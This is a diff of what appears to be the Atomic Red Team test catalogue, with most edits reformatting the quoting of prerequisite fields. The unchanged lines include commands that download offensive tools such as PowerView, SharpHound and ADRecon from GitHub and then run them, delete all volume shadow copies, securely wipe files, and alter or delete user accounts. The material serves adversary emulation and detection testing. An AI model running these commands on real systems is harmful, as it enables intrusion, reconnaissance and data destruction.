-        get_prereq_command: |-
+      - description: 'T1218-2.dll must exist on disk at specified location (#{dll_payload})
+
+'
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
       executor:
@@ -31994,9 +32630,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1218\src\Infdefaultinstall.inf
       dependency_executor_name: powershell
       dependencies:
-      - description: INF file must exist on disk at specified location (#{inf_to_execute})
-        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'INF file must exist on disk at specified location (#{inf_to_execute})
+
+'
+        prereq_command: 'if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/Infdefaultinstall.inf" -OutFile "#{inf_to_execute}"
       executor:
@@ -33113,10 +33753,14 @@ defense-evasion:
           default: "$env:TEMP\\T1551.006_timestomp.txt"
       dependency_executor_name: powershell
       dependencies:
-      - description: A file must exist at the path (#{file_path}) to change the creation
+      - description: 'A file must exist at the path (#{file_path}) to change the creation
           time on
-        prereq_command: 'if (Test-Path #{file_path}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path #{file_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Path #{file_path} -Force | Out-Null
           Set-Content #{file_path} -Value "T1551.006 Timestomp" -Force | Out-Null
       executor:
@@ -33146,10 +33790,14 @@ defense-evasion:
           default: "$env:TEMP\\T1551.006_timestomp.txt"
       dependency_executor_name: powershell
       dependencies:
-      - description: A file must exist at the path (#{file_path}) to change the modified
+      - description: 'A file must exist at the path (#{file_path}) to change the modified
           time on
-        prereq_command: 'if (Test-Path #{file_path}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path #{file_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Path #{file_path} -Force | Out-Null
           Set-Content #{file_path} -Value "T1551.006 Timestomp" -Force | Out-Null
       executor:
@@ -33179,10 +33827,14 @@ defense-evasion:
           default: "$env:TEMP\\T1551.006_timestomp.txt"
       dependency_executor_name: powershell
       dependencies:
-      - description: A file must exist at the path (#{file_path}) to change the last
+      - description: 'A file must exist at the path (#{file_path}) to change the last
           access time on
-        prereq_command: 'if (Test-Path #{file_path}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path #{file_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Path #{file_path} -Force | Out-Null
           Set-Content #{file_path} -Value "T1551.006 Timestomp" -Force | Out-Null
       executor:
@@ -33208,15 +33860,27 @@ defense-evasion:
           default: "$env:appdata\\Microsoft"
       dependency_executor_name: powershell
       dependencies:
-      - description: 'timestomp.ps1 must be present in #{file_path}.'
+      - description: 'timestomp.ps1 must be present in #{file_path}.
+
+'
         prereq_command: 'if (Test-Path #{file_path}\timestomp.ps1) {exit 0} else {exit
-          1}'
-        get_prereq_command: Invoke-WebRequest "https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1"
+          1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest "https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1"
           -OutFile "#{file_path}\timestomp.ps1"
-      - description: 'kxwn.lock must be present in #{file_path}.'
-        prereq_command: if (Test-Path -path "#{file_path}\kxwn.lock") {exit 0} else
+
+'
+      - description: 'kxwn.lock must be present in #{file_path}.
+
+'
+        prereq_command: 'if (Test-Path -path "#{file_path}\kxwn.lock") {exit 0} else
           {exit 1}
-        get_prereq_command: 'New-Item -Path #{file_path}\kxwn.lock -ItemType File'
+
+'
+        get_prereq_command: 'New-Item -Path #{file_path}\kxwn.lock -ItemType File
+
+'
       executor:
         command: |
           import-module #{file_path}\timestomp.ps1
@@ -33940,9 +34604,14 @@ defense-evasion:
           default: "%temp%\\T1222.001_takeown_folder"
       dependency_executor_name: command_prompt
       dependencies:
-      - description: Test requrires a file to take ownership of to be located at (#{file_folder_to_own})
-        prereq_command: 'IF EXIST #{file_folder_to_own} ( EXIT 0 ) ELSE ( EXIT 1 )'
-        get_prereq_command: |-
+      - description: 'Test requrires a file to take ownership of to be located at
+          (#{file_folder_to_own})
+
+'
+        prereq_command: 'IF EXIST #{file_folder_to_own} ( EXIT 0 ) ELSE ( EXIT 1 )
+
+'
+        get_prereq_command: |
           mkdir #{file_folder_to_own}
           echo T1222.001_takeown1 >> #{file_folder_to_own}\T1222.001_takeown1.txt
           echo T1222.001_takeown2 >> #{file_folder_to_own}\T1222.001_takeown2.txt
@@ -33970,9 +34639,13 @@ defense-evasion:
           default: Everyone
       dependency_executor_name: command_prompt
       dependencies:
-      - description: Test requrires a file to modifyto be located at (#{file_or_folder})
-        prereq_command: 'IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )'
-        get_prereq_command: |-
+      - description: 'Test requrires a file to modifyto be located at (#{file_or_folder})
+
+'
+        prereq_command: 'IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )
+
+'
+        get_prereq_command: |
           mkdir #{file_or_folder}
           echo T1222.001_cacls1 >> #{file_or_folder}\T1222.001_cacls1.txt
           echo T1222.001_cacls2 >> #{file_or_folder}\T1222.001_cacls2.txt
@@ -33995,9 +34668,13 @@ defense-evasion:
           default: "%temp%\\T1222.001_attrib"
       dependency_executor_name: command_prompt
       dependencies:
-      - description: Test requrires a file to modify to be located at (#{file_or_folder})
-        prereq_command: 'IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )'
-        get_prereq_command: |-
+      - description: 'Test requrires a file to modify to be located at (#{file_or_folder})
+
+'
+        prereq_command: 'IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )
+
+'
+        get_prereq_command: |
           mkdir #{file_or_folder}
           echo T1222.001_attrib1 >> #{file_or_folder}\T1222.001_attrib1.txt
           echo T1222.001_attrib2 >> #{file_or_folder}\T1222.001_attrib2.txt
@@ -34117,14 +34794,22 @@ defense-evasion:
           default: PathToAtomicsFolder\T1220\src\msxslscript.xsl
       dependency_executor_name: powershell
       dependencies:
-      - description: XML file must exist on disk at specified location (#{xmlfile})
-        prereq_command: 'if (Test-Path #{xmlfile}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'XML file must exist on disk at specified location (#{xmlfile})
+
+'
+        prereq_command: 'if (Test-Path #{xmlfile}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{xmlfile}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml" -OutFile "#{xmlfile}"
-      - description: XSL file must exist on disk at specified location (#{xslfile})
-        prereq_command: 'if (Test-Path #{xslfile}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'XSL file must exist on disk at specified location (#{xslfile})
+
+'
+        prereq_command: 'if (Test-Path #{xslfile}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{xslfile}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl" -OutFile "#{xslfile}"
       executor:
@@ -34175,9 +34860,13 @@ defense-evasion:
           default: PathToAtomicsFolder\T1220\src\wmicscript.xsl
       dependency_executor_name: powershell
       dependencies:
-      - description: XSL file must exist on disk at specified location (#{local_xsl_file})
-        prereq_command: 'if (Test-Path #{local_xsl_file}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'XSL file must exist on disk at specified location (#{local_xsl_file})
+
+'
+        prereq_command: 'if (Test-Path #{local_xsl_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{local_xsl_file}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl" -OutFile "#{local_xsl_file}"
       executor:
@@ -34287,9 +34976,15 @@ impact:
           type: string
           default: HuHuHUHoHo283283@dJD
       dependencies:
-      - description: 'User account to change password of must exist (User: #{user_account})'
-        prereq_command: 'net user #{user_account}'
-        get_prereq_command: 'net user #{user_account} #{new_user_password} /add'
+      - description: 'User account to change password of must exist (User: #{user_account})
+
+'
+        prereq_command: 'net user #{user_account}
+
+'
+        get_prereq_command: 'net user #{user_account} #{new_user_password} /add
+
+'
       executor:
         command: 'net.exe user #{user_account} #{new_password}
 
@@ -34317,9 +35012,15 @@ impact:
           type: string
           default: AtomicUser
       dependencies:
-      - description: 'User account to delete must exist (User: #{user_account})'
-        prereq_command: 'net user #{user_account}'
-        get_prereq_command: 'net user #{user_account} #{new_user_password} /add'
+      - description: 'User account to delete must exist (User: #{user_account})
+
+'
+        prereq_command: 'net user #{user_account}
+
+'
+        get_prereq_command: 'net user #{user_account} #{new_user_password} /add
+
+'
       executor:
         command: 'net.exe user #{user_account} /delete
 
@@ -34335,10 +35036,16 @@ impact:
       - windows
       dependency_executor_name: powershell
       dependencies:
-      - description: Requires the Active Directory module for powershell to be installed.
-        prereq_command: if(Get-Module -ListAvailable -Name ActiveDirectory) {exit
+      - description: 'Requires the Active Directory module for powershell to be installed.
+
+'
+        prereq_command: 'if(Get-Module -ListAvailable -Name ActiveDirectory) {exit
           0} else {exit 1}
-        get_prereq_command: Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
+
+'
+        get_prereq_command: 'Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
+
+'
       input_arguments:
         super_user:
           description: Account used to run the execution command (must include domain).
@@ -34562,17 +35269,27 @@ impact:
           default: "$env:TEMP\\T1485.txt"
       dependency_executor_name: powershell
       dependencies:
-      - description: Secure delete tool from Sysinternals must exist on disk at specified
+      - description: 'Secure delete tool from Sysinternals must exist on disk at specified
           location (#{sdelete_exe})
-        prereq_command: 'if (Test-Path #{sdelete_exe}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+
+'
+        prereq_command: 'if (Test-Path #{sdelete_exe}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           Invoke-WebRequest "https://download.sysinternals.com/files/SDelete.zip" -OutFile "$env:TEMP\SDelete.zip"
           Expand-Archive $env:TEMP\SDelete.zip $env:TEMP\Sdelete -Force
           Remove-Item $env:TEMP\SDelete.zip -Force
-      - description: 'The file to delete must exist at #{file_to_delete}'
+      - description: 'The file to delete must exist at #{file_to_delete}
+
+'
         prereq_command: 'if (Test-Path #{file_to_delete}) { exit 0 } else { exit 1
-          }'
-        get_prereq_command: 'New-Item #{file_to_delete} -Force | Out-Null'
+          }
+
+'
+        get_prereq_command: 'New-Item #{file_to_delete} -Force | Out-Null
+
+'
       executor:
         command: 'Invoke-Expression -Command "#{sdelete_exe} -accepteula #{file_to_delete}"
 
@@ -35297,11 +36014,17 @@ impact:
       - windows
       dependency_executor_name: powershell
       dependencies:
-      - description: Create volume shadow copy of C:\ . This prereq command only works
-          on Windows Server or Windows 8.
-        prereq_command: if(!(vssadmin.exe list shadows | findstr "No items found that
-          satisfy the query.")) { exit 0 } else { exit 1 }
-        get_prereq_command: 'vssadmin.exe create shadow /for=c:'
+      - description: 'Create volume shadow copy of C:\ . This prereq command only
+          works on Windows Server or Windows 8.
+
+'
+        prereq_command: 'if(!(vssadmin.exe list shadows | findstr "No items found
+          that satisfy the query.")) { exit 0 } else { exit 1 }
+
+'
+        get_prereq_command: 'vssadmin.exe create shadow /for=c:
+
+'
       executor:
         command: 'vssadmin.exe delete shadows /all /quiet
 
@@ -36381,9 +37104,13 @@ discovery:
           default: "%TEMP%\\T1010.exe"
       dependency_executor_name: powershell
       dependencies:
-      - description: T1010.cs must exist on disk at specified location (#{input_source_code})
-        prereq_command: 'if (Test-Path #{input_source_code}) {exit 0} else {exit 1}'
-        get_prereq_command: |-
+      - description: 'T1010.cs must exist on disk at specified location (#{input_source_code})
+
+'
+        prereq_command: 'if (Test-Path #{input_source_code}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{input_source_code}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "#{input_source_code}"
       executor:
@@ -36877,10 +37604,16 @@ discovery:
           default: "$env:TEMP\\ADRecon.ps1"
       dependency_executor_name: powershell
       dependencies:
-      - description: ADRecon must exist on disk at specified location (#{adrecon_path})
-        prereq_command: 'if (Test-Path #{adrecon_path}) {exit 0} else {exit 1}'
+      - description: 'ADRecon must exist on disk at specified location (#{adrecon_path})
+
+'
+        prereq_command: 'if (Test-Path #{adrecon_path}) {exit 0} else {exit 1}
+
+'
         get_prereq_command: 'Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sense-of-security/ADRecon/38e4abae3e26d0fa87281c1d0c65cabd4d3c6ebd/ADRecon.ps1"
-          -OutFile #{adrecon_path}'
+          -OutFile #{adrecon_path}
+
+'
       executor:
         command: 'Invoke-Expression #{adrecon_path}
 
@@ -37043,15 +37776,27 @@ discovery:
       - windows
       dependency_executor_name: powershell
       dependencies:
-      - description: Computer must be domain joined.
-        prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+      - description: 'Computer must be domain joined.
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
           {exit 0} else {exit 1}
-        get_prereq_command: Write-Host Joining this computer to a domain must be done
-          manually.
-      - description: Requires the Active Directory module for powershell to be installed.
-        prereq_command: if(Get-Module -ListAvailable -Name ActiveDirectory) {exit
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually.
+
+'
+      - description: 'Requires the Active Directory module for powershell to be installed.
+
+'
+        prereq_command: 'if(Get-Module -ListAvailable -Name ActiveDirectory) {exit
           0} else {exit 1}
-        get_prereq_command: Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
+
+'
+        get_prereq_command: 'Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
+
+'
       executor:
         name: powershell
         elevation_required: false
@@ -37153,9 +37898,15 @@ discovery:
       supported_platforms:
       - windows
       dependencies:
-      - description: nltest.exe from RSAT must be present on disk
-        prereq_command: WHERE nltest.exe >NUL 2>&1
-        get_prereq_command: echo Sorry RSAT must be installed manually
+      - description: 'nltest.exe from RSAT must be present on disk
+
+'
+        prereq_command: 'WHERE nltest.exe >NUL 2>&1
+
+'
+        get_prereq_command: 'echo Sorry RSAT must be installed manually
+
+'
       executor:
         command: 'nltest /domain_trusts
 
@@ -37170,16 +37921,28 @@ discovery:
       - windows
       dependency_executor_name: powershell
       dependencies:
-      - description: PowerView PowerShell script must exist on disk
-        prereq_command: if (Test-Path $env:TEMP\PowerView.ps1) {exit 0} else {exit
+      - description: 'PowerView PowerShell script must exist on disk
+
+'
+        prereq_command: 'if (Test-Path $env:TEMP\PowerView.ps1) {exit 0} else {exit
           1}
-        get_prereq_command: Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1"
+
+'
+        get_prereq_command: 'Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1"
           -OutFile "$env:TEMP\PowerView.ps1"
-      - description: RSAT PowerShell AD admin cmdlets must be installed
-        prereq_command: if ((Get-Command "Get-ADDomain" -ErrorAction Ignore) -And
+
+'
+      - description: 'RSAT PowerShell AD admin cmdlets must be installed
+
+'
+        prereq_command: 'if ((Get-Command "Get-ADDomain" -ErrorAction Ignore) -And
           (Get-Command "Get-ADGroupMember" -ErrorAction Ignore)) { exit 0 } else {
           exit 1 }
-        get_prereq_command: Write-Host "Sorry RSAT must be installed manually"
+
+'
+        get_prereq_command: 'Write-Host "Sorry RSAT must be installed manually"
+
+'
       executor:
         command: |
           Import-Module "$env:TEMP\PowerView.ps1"
@@ -37498,11 +38261,17 @@ discovery:
           default: "/tmp/T1087.001.txt"
       dependency_executor_name: sh
       dependencies:
-      - description: Check if lastlog command exists on the machine
-        prereq_command: if [ -x "$(command -v lastlog)" ]; then exit 0; else exit
+      - description: 'Check if lastlog command exists on the machine
+
+'
+        prereq_command: 'if [ -x "$(command -v lastlog)" ]; then exit 0; else exit
           1;
-        get_prereq_command: echo "Install lastlog on the machine to run the test.";
+
+'
+        get_prereq_command: 'echo "Install lastlog on the machine to run the test.";
           exit 1;
+
+'
       executor:
         command: |
           lastlog > #{output_file}
@@ -37772,11 +38541,17 @@ discovery:
           default: 192.168.1.0/24
       dependency_executor_name: sh
       dependencies:
-      - description: Check if nmap command exists on the machine
-        prereq_command: if [ -x "$(command -v nmap)" ]; then exit 0; else exit 1;
+      - description: 'Check if nmap command exists on the machine
+
+'
+        prereq_command: 'if [ -x "$(command -v nmap)" ]; then exit 0; else exit 1;
           fi;
-        get_prereq_command: echo "Install nmap on the machine to run the test."; exit
-          1;
+
+'
+        get_prereq_command: 'echo "Install nmap on the machine to run the test.";
+          exit 1;
+
+'
       executor:
         command: |
           nmap -sS #{network_range} -p #{port}
@@ -37799,9 +38574,11 @@ discovery:
           default: 127.0.0.1
       dependency_executor_name: powershell
       dependencies:
-      - description: NMap must be installed
+      - description: 'NMap must be installed
+
+'
         prereq_command: if (cmd /c nmap 2>nul) {exit 0} else {exit 1}
-        get_prereq_command: |-
+        get_prereq_command: |
           Invoke-WebRequest -OutFile $env:temp\nmap-7.80-setup.exe #{nmap_url}
           Start-Process $env:temp\nmap-7.80-setup.exe /S
       executor:
@@ -38035,11 +38812,17 @@ discovery:
           default: ens33
       dependency_executor_name: bash
       dependencies:
-      - description: Check if at least one of the tools are installed on the machine.
-        prereq_command: if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command -v
-          tshark)" ]; then exit 1; else exit 0; fi;
-        get_prereq_command: echo "Install tcpdump and/or tshark for the test to run.";
+      - description: 'Check if at least one of the tools are installed on the machine.
+
+'
+        prereq_command: 'if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command
+          -v tshark)" ]; then exit 1; else exit 0; fi;
+
+'
+        get_prereq_command: 'echo "Install tcpdump and/or tshark for the test to run.";
           exit 1;
+
+'
       executor:
         command: |
           tcpdump -c 5 -nnni #{interface}
@@ -38061,11 +38844,17 @@ discovery:
           default: en0A
       dependency_executor_name: bash
       dependencies:
-      - description: Check if at least one of the tools are installed on the machine.
-        prereq_command: if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command -v
-          tshark)" ]; then exit 1; else exit 0; fi;
-        get_prereq_command: echo "Install tcpdump and/or tshark for the test to run.";
+      - description: 'Check if at least one of the tools are installed on the machine.
+
+'
+        prereq_command: 'if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command
+          -v tshark)" ]; then exit 1; else exit 0; fi;
+
+'
+        get_prereq_command: 'echo "Install tcpdump and/or tshark for the test to run.";
           exit 1;
+
+'
       executor:
         command: "sudo tcpdump -c 5 -nnni #{interface}    \nif [ -x \"$(command -v
           tshark)\" ]; then sudo tshark -c 5 -i #{interface}; fi;\n"
@@ -38162,10 +38951,16 @@ discovery:
       supported_platforms:
       - linux
       dependencies:
-      - description: System must be CentOS or RHEL v7
-        prereq_command: if [ $(rpm -q --queryformat '%{VERSION}') -eq "7" ]; then
+      - description: 'System must be CentOS or RHEL v7
+
+'
+        prereq_command: 'if [ $(rpm -q --queryformat ''%{VERSION}'') -eq "7" ]; then
           exit /b 0; else exit /b 1; fi;
-        get_prereq_command: echo Please run from CentOS or RHEL v7
+
+'
+        get_prereq_command: 'echo Please run from CentOS or RHEL v7
+
+'
       executor:
         command: 'cat /etc/security/pwquality.conf
 
@@ -38180,10 +38975,16 @@ discovery:
       supported_platforms:
       - linux
       dependencies:
-      - description: System must be CentOS or RHEL v6
-        prereq_command: if [ $(rpm -q --queryformat '%{VERSION}') -eq "6" ]; then
+      - description: 'System must be CentOS or RHEL v6
+
+'
+        prereq_command: 'if [ $(rpm -q --queryformat ''%{VERSION}'') -eq "6" ]; then
           exit /b 0; else exit /b 1; fi;
-        get_prereq_command: echo Please run from CentOS or RHEL v6
+
+'
+        get_prereq_command: 'echo Please run from CentOS or RHEL v6
+
+'
       executor:
         command: |
           cat /etc/pam.d/system-auth
@@ -38663,9 +39464,16 @@ discovery:
       - macos
       dependency_executor_name: sh
       dependencies:
-      - description: Check if arp command exists on the machine
-        prereq_command: if [ -x "$(command -v arp)" ]; then exit 0; else exit 1; fi;
-        get_prereq_command: echo "Install arp on the machine."; exit 1;
+      - description: 'Check if arp command exists on the machine
+
+'
+        prereq_command: 'if [ -x "$(command -v arp)" ]; then exit 0; else exit 1;
+          fi;
+
+'
+        get_prereq_command: 'echo "Install arp on the machine."; exit 1;
+
+'
       executor:
         command: 'arp -a | grep -v ''^?''
 
@@ -38740,15 +39548,33 @@ discovery:
           default: 192.168.1.1
       dependency_executor_name: powershell
       dependencies:
-      - description: Computer must have python 3 installed
-        prereq_command: if (python --version) {exit 0} else {exit 1}
-        get_prereq_command: echo "Python 3 must be installed manually"
-      - description: Computer must have pip installed
-        prereq_command: if (pip3 -V) {exit 0} else {exit 1}
-        get_prereq_command: echo "PIP must be installed manually"
-      - description: adidnsdump must be installed and part of PATH
-        prereq_command: if (cmd /c adidnsdump -h) {exit 0} else {exit 1}
-        get_prereq_command: pip3 install adidnsdump
+      - description: 'Computer must have python 3 installed
+
+'
+        prereq_command: 'if (python --version) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'echo "Python 3 must be installed manually"
+
+'
+      - description: 'Computer must have pip installed
+
+'
+        prereq_command: 'if (pip3 -V) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'echo "PIP must be installed manually"
+
+'
+      - description: 'adidnsdump must be installed and part of PATH
+
+'
+        prereq_command: 'if (cmd /c adidnsdump -h) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'pip3 install adidnsdump
+
+'
       executor:
         command: 'adidnsdump -u #{user_name} -p #{acct_pass} --print-zones #{host_name}
 
@@ -39372,9 +40198,13 @@ discovery:
           default: PathToAtomicsFolder\T1016\src\top-128.txt
       dependency_executor_name: powershell
       dependencies:
-      - description: 'Test requires #{port_file} to exist'
-        prereq_command: if (Test-Path "#{port_file}") {exit 0} else {exit 1}
-        get_prereq_command: |-
+      - description: 'Test requires #{port_file} to exist
+
+'
+        prereq_command: 'if (Test-Path "#{port_file}") {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
           New-Item -Type Directory (split-path #{port_file}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "#{portfile_url}" -OutFile "#{port_file}"
       executor:
@@ -39500,10 +40330,16 @@ discovery:
       - macos
       dependency_executor_name: sh
       dependencies:
-      - description: Check if netstat command exists on the machine
-        prereq_command: if [ -x "$(command -v netstat)" ]; then exit 0; else exit
+      - description: 'Check if netstat command exists on the machine
+
+'
+        prereq_command: 'if [ -x "$(command -v netstat)" ]; then exit 0; else exit
           1; fi;
-        get_prereq_command: echo "Install netstat on the machine."; exit 1;
+
+'
+        get_prereq_command: 'echo "Install netstat on the machine."; exit 1;
+
+'
       executor:
         command: |
           netstat
@@ -40094,14 +40930,26 @@ execution:
           default: echo Hello from Atomic Red Team
       dependency_executor_name: sh
       dependencies:
-      - description: The `at` and `atd` executables must exist in the PATH
-        prereq_command: which at && which atd
+      - description: 'The `at` and `atd` executables must exist in the PATH
+
+'
+        prereq_command: 'which at && which atd
+
+'
         get_prereq_command: 'echo ''Please install `at` and `atd`; they were not found
-          in the PATH (Package name: `at`)'''
-      - description: The `atd` daemon must be running
-        prereq_command: systemctl status atd || service atd status
+          in the PATH (Package name: `at`)''
+
+'
+      - description: 'The `atd` daemon must be running
+
+'
+        prereq_command: 'systemctl status atd || service atd status
+
+'
         get_prereq_command: 'echo ''Please start the `atd` daemon (sysv: `service
-          atd start` ; systemd: `systemctl start atd`)'''
+          atd start` ; systemd: `systemctl start atd`)''
+
+'
       executor:
         name: sh
         elevation_required: false
@@ -41104,11 +41952,15 @@ execution:
           default: '16.0'
       dependency_executor_name: powershell
       dependencies:
-      - description: Test Requires MS Office to be installed and have been run previously.
+      - description: 'Test Requires MS Office to be installed and have been run previously.
           Run -GetPrereqs to run msword and build dependant registry keys
-        prereq_command: If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version})
+
+'
+        prereq_command: 'If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version})
           { exit 0 } else { exit 1 }
-        get_prereq_command: |-
+
+'
+        get_prereq_command: |
           $msword = New-Object -ComObject word.application
           Stop-Process -Name WINWORD
       executor:
@@ -41162,11 +42014,15 @@ execution:
           default: '16.0'
       dependency_executor_name: powershell
       dependencies:
-      - description: Test Requires MS Office to be installed and have been run previously.
+      - description: 'Test Requires MS Office to be installed and have been run previously.
           Run -GetPrereqs to run msword and build dependant registry keys
-        prereq_command: If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version})
+
+'
+        prereq_command: 'If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version})
           { exit 0 } else { exit 1 }
-        get_prereq_command: |-
+
+'
+        get_prereq_command: |
           $msword = New-Object -ComObject word.application
           Stop-Process -Name WINWORD
       executor:
@@ -41202,11 +42058,15 @@ execution:
           default: '16.0'
       dependency_executor_name: powershell
       dependencies:
-      - description: Test Requires MS Office to be installed and have been run previously.
+      - description: 'Test Requires MS Office to be installed and have been run previously.
           Run -GetPrereqs to run msword and build dependant registry keys
-        prereq_command: If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version})
+
+'
+        prereq_command: 'If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version})
           { exit 0 } else { exit 1 }
-        get_prereq_command: |-
+
+'
+        get_prereq_command: |
           $msword = New-Object -ComObject word.application
           Stop-Process -Name WINWORD
       executor:
@@ -41492,11 +42352,17 @@ execution:
           default: PathToAtomicsFolder\T1059.001\src
       dependency_executor_name: powershell
       dependencies:
-      - description: 'SharpHound.ps1 must be located at #{file_path}'
+      - description: 'SharpHound.ps1 must be located at #{file_path}
+
+'
         prereq_command: 'if (Test-Path #{file_path}\SharpHound.ps1) {exit 0} else
-          {exit 1}'
-        get_prereq_command: Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1"
+          {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1"
           -OutFile "#{file_path}\SharpHound.ps1"
+
+'
       executor:
         command: |
           write-host "Import and Execution of SharpHound.ps1 from #{file_path}" -ForegroundColor Cyan
@@ -41675,11 +42541,17 @@ execution:
       supported_platforms:
       - windows
       dependencies:
-      - description: PowerShell version 2 must be installed
-        prereq_command: if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {exit
+      - description: 'PowerShell version 2 must be installed
+
+'
+        prereq_command: 'if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {exit
           0} else {exit 1}
-        get_prereq_command: Write-Host  Automated installer not implemented yet, please
-          install PowerShell v2 manually
+
+'
+        get_prereq_command: 'Write-Host  Automated installer not implemented yet,
+          please install PowerShell v2 manually
+
+'
       executor:
         command: 'powershell.exe -version 2 -Command Write-Host $PSVersion
 
@@ -41699,10 +42571,16 @@ execution:
           type: String
           default: "$env:TEMP\\NTFS_ADS.txt"
       dependencies:
-      - description: Homedrive must be an NTFS drive
-        prereq_command: if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem
+      - description: 'Homedrive must be an NTFS drive
+
+'
+        prereq_command: 'if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem
           -contains "NTFS") {exit 0} else {exit 1}
-        get_prereq_command: Write-Host Prereq's for this test cannot be met automatically
+
+'
+        get_prereq_command: 'Write-Host Prereq''s for this test cannot be met automatically
+
+'
       executor:
         name: powershell
         command: |
@@ -41726,10 +42604,14 @@ execution:
           type: String
           default: "$env:COMPUTERNAME"
       dependencies:
-      - description: PSRemoting must be enabled
+      - description: 'PSRemoting must be enabled
+
+'
         prereq_command: "Try {\n    New-PSSession -ComputerName #{hostname_to_connect}
-          -ErrorAction Stop | Out-Null\n    exit 0\n} \nCatch {\n    exit 1\n}"
-        get_prereq_command: Enable-PSRemoting
+          -ErrorAction Stop | Out-Null\n    exit 0\n} \nCatch {\n    exit 1\n}\n"
